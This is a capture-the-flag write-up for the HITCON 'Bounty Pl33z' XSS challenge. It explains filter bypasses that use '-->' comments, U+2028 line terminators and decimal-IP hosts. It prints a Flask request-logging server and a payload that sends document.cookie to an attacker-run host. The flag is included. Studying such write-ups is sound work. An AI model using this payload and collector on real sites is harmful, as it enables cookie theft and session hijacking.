# Bounty Pl33z [255pts]

## Description
```
Where's my bounty?
http://3.114.5.202/

Hint: flag in cookies
Author: 🤣filedescriptor feat.🍊Orange
30 Teams solved.
```
## Content

In this challenge, we should make XSS payload with fd.php, as index.php is refusing all url except ones starting with `http://3.114.5.202`

fd.php makes redirection to url containing passed parameter, but some characters are filtered.

Our parameter goes here :

    window.self.location.href = "https://<?=$host;?>/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";


With some tests, it was figured out that `\r`, `\n`, `/`, `\`, `<`, `.` characters removed, and `"`, `'` characters should only occur once.

## Solution

### Single Line Comment in JS

As we want to add document[\`cookie\`] to the url, we need to escape the string, that means we need to use a quote.
The problem is that after putting our url with one quote should make valid JS code. (Or else, browser will refuse to execute it.)
I wanted to make comment without using `/`, (as all I know about js comments are `// ..` or `/* .. */`) I dived into [ECMAScipt Language Specification](https://www.ecma-international.org/ecma-262/10.0/index.html).
And finally I found that `-->` can be used as single line comment at [HTML-like Comments](https://www.ecma-international.org/ecma-262/10.0/index.html#sec-html-like-comments).

### Line Terminator in JS

But another problem emerged: If `-->` want to work as single line comment, Only WhiteSpaceSequence or SingleLineDelimietedCommentSequence can come before `-->` in the line.
So I tried to find out line delimiters except `\n` or `\r`.
Luckily, I found out that U+2028 or U+2029 can used as line terminator in JS at [Line Terminators](https://www.ecma-international.org/ecma-262/10.0/index.html#sec-line-terminators).
We can use UTF-8 encoding to use these characters in url: `%E2%20%A8` or `%E2%20%A9`

### HTTPS server

We also need a HTTPS server.
I wrote a simple HTTPS server with flask :
```
#!/usr/bin/env python3
from flask import Flask, request
import os
app = Flask(__name__)
app.secret_key = "sumango3"
@app.route('/')
def main():
    with open('log.txt', 'a') as f:
    	f.write(str(request.__dict__))
        f.write('<br><br>')
    with open('log.txt','r') as f:
        return f.read()

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=1234, ssl_context='adhoc')
```

### URL Host without dot

To make non-dot url, we can use decimal ip for url as following:
A.B.C.D --> A * 256^3 + B * 256^2 + C * 256 + D

If my ip address is 1.2.3.4, 16909060 can be used.

### Payload

So final payload is as following:

    http://3.114.5.202/fd.php?q=16909060:1234?ck="%2Bdocument[`cookie`]%E2%20%A8-->

fd.php will return following code: (Line Separator character is non printable)

    window.self.location.href = "https://16909060:1234?ck="+document[`cookie`]<LS>-->oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";

which is valid JS code.

## Flag

    hitcon{/FD 1s 0ur g0d <(_ _)>}

## Appendix

[HTTPS server](https://github.com/sumango3/ctf/blob/master/Utils/https-server.py)
